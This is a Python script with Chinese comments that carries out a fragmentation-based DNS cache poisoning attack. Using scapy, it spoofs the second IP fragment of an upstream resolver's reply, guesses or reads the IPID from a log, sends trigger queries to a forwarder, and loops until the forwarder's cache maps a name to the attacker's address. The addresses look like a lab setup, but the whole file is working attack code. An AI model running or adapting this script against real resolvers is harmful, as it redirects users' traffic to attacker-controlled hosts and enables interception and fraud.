#!/usr/bin/env python3

import socket
import random
import uuid
import time
import multiprocessing
import re
import os
from utils import build_fake_respones
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sr1, raw

# --- Configuration ---
FORWARDER_IP = '10.0.0.2'
UPSTREAM_RESOLVER_IP = '10.0.0.3'
VICTIM = b'example.com'
ATTACKER = b'victim.cn'
ATTACKER_IP = '9.9.9.9'
ORIGIN_IP = '1.1.1.1'
CHAIN_LENGTH = 55
CHAIN_PREFIX = b'c'

IP_FRAGMENT_OFFSET = 1480 
UDP_HEADER_LENGTH = 8      
DNS_PAYLOAD_OFFSET = IP_FRAGMENT_OFFSET - UDP_HEADER_LENGTH 

ATTACK_LOG_FILE = "/logs/attack_log.txt"
AUTH_LOG_PATH = "/logs/ipid_log.txt"

# --- 动态 IPID 攻击配置 ---
IPID_SAMPLE_SIZE = 1
WINDOW_BEHIND = 100
WINDOW_AHEAD = 600

# --- 时序与性能配置 ---
CYCLE_DELAY_SECONDS = 0
VERIFICATION_DELAY_SECONDS = 1
NUM_PROCESSES = multiprocessing.cpu_count()

def build_poisoned_fragment(qname: bytes) -> bytes:
    """
    根据精确计算的 DNS_PAYLOAD_OFFSET 来切分载荷。
    """
    full_poisoned_payload = build_fake_respones(
        qname, 
        CHAIN_PREFIX,
        VICTIM,
        ORIGIN_IP,
        ATTACKER,
        ATTACKER_IP,
        CHAIN_LENGTH
        )
    # 使用修正后的偏移量进行切片
    second_fragment_payload = full_poisoned_payload[DNS_PAYLOAD_OFFSET:]
    return second_fragment_payload


def send_worker(args):
    ipid, poison_payload = args
    # IP报头的frag字段需要设置为IP层偏移量除以8
    packet = IP(src=UPSTREAM_RESOLVER_IP, dst=FORWARDER_IP, id=ipid, frag=IP_FRAGMENT_OFFSET // 8, proto=17) / poison_payload
    send(packet, verbose=0)


def get_latest_observed_ipid(log_path: str) -> int or None:
    if not os.path.exists(log_path): return None
    try:
        with open(log_path, 'r') as f: lines = f.readlines()
        for line in reversed(lines):
            match = re.search(r"IPID=(\d+)", line)
            if match: return int(match.group(1))
    except (IOError, IndexError): return None
    return None


def main():
    with open(ATTACK_LOG_FILE, 'w') as f: f.write(f"--- Attack Log Initialized at {time.ctime()} ---\n")
    print(f"[*] Attack log file '{ATTACK_LOG_FILE}' has been cleared.")
    print("--- Starting FULLY AUTOMATED Self-Calibrating Attack via Shared Volume ---")
    print(f"[*] DNS Payload Slice Offset correctly calculated to: {DNS_PAYLOAD_OFFSET}")
    print(f"[*] Process pool size: {NUM_PROCESSES}.")
    
    cycle_count = 0
    base_ipid = None

    while True:
        cycle_count += 1
        print(f"\n" + "="*50)
        print(f"--- Attack Cycle {cycle_count} ---")
        
        trigger_qname = f"{uuid.uuid4().hex[:8]}.{VICTIM.decode()}"
        print(f"[*] Triggering attack with query: '{trigger_qname}'...")
        
        poison_payload = build_poisoned_fragment(trigger_qname.encode())
        print(f"[*] Poisoned fragment payload created for this cycle (size: {len(poison_payload)} bytes).") # 现在这个size应该是1056

        if base_ipid is None:
            print(f"[*] First cycle. Attempting to read latest IPID from '{AUTH_LOG_PATH}'...")
            latest_ipid = get_latest_observed_ipid(AUTH_LOG_PATH)
            if latest_ipid is not None:
                base_ipid = latest_ipid
                print(f"    -> Success! Found initial IPID: {base_ipid}")
            else:
                base_ipid = random.randint(0, 65535)
                print(f"    -> Warning: Could not read log. Starting with a random IPID: {base_ipid}")
        else:
            latest_ipid = get_latest_observed_ipid(AUTH_LOG_PATH)
            if latest_ipid is not None: base_ipid = latest_ipid
                
        print(f"[*] Using Base IPID for this cycle: {base_ipid}")

        start_ipid = min(65535 - IPID_SAMPLE_SIZE, base_ipid + WINDOW_BEHIND) if base_ipid + WINDOW_BEHIND > 0 else 0
        end_ipid = min(65535, base_ipid + WINDOW_AHEAD)
        print(f"[*] Creating adaptive window: [{start_ipid}, {end_ipid}]")

        if start_ipid >= end_ipid:
            print("[!] Window is empty or invalid. Retrying...")
            time.sleep(CYCLE_DELAY_SECONDS)
            continue
        
        ipid_population = range(start_ipid, end_ipid)
        num_samples = min(IPID_SAMPLE_SIZE, len(ipid_population))
        sampled_ipids = random.sample(ipid_population, k=num_samples)
        worker_args = [(ipid, poison_payload) for ipid in sampled_ipids]
        
        send(IP(dst=FORWARDER_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=trigger_qname)), verbose=0)
        
        send_worker((1, poison_payload))
        # print(f"[*] Dispatching {len(sampled_ipids)} packets to the process pool...")
        # with multiprocessing.Pool(processes=NUM_PROCESSES) as pool:
        #     pool.map(send_worker, worker_args)
        
        # with open(ATTACK_LOG_FILE, 'a') as f:
        #     f.write(f"\nCycle: {cycle_count} (Base IPID: {base_ipid})\n")
        #     f.write(f"  Trigger Query: {trigger_qname}\n")
        #     f.write(f"  Sampled IPIDs ({len(sampled_ipids)} from [{start_ipid}, {end_ipid}]): {sorted(sampled_ipids)}\n")

        time.sleep(VERIFICATION_DELAY_SECONDS)
        response = sr1(IP(dst=FORWARDER_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=ATTACKER)), timeout=2, verbose=0)
        
        if response and response.haslayer(DNSRR) and response.an:
            for i in range(response.ancount):
                rr = response.an[i]
                if rr.type == 1 and rr.rdata == ATTACKER_IP:
                    success_message = f"\n[+] >>> SUCCESS! <<< Cache for '{ATTACKER.decode()}' POISONED with '{ATTACKER_IP}'.\n"
                    print(success_message)
                    with open(ATTACK_LOG_FILE, 'a') as f: f.write("\n" + success_message)
                    return
        
        print(f"[*] Cycle {cycle_count} finished without success. Continuing...")
        time.sleep(CYCLE_DELAY_SECONDS)

if __name__ == '__main__':
    main()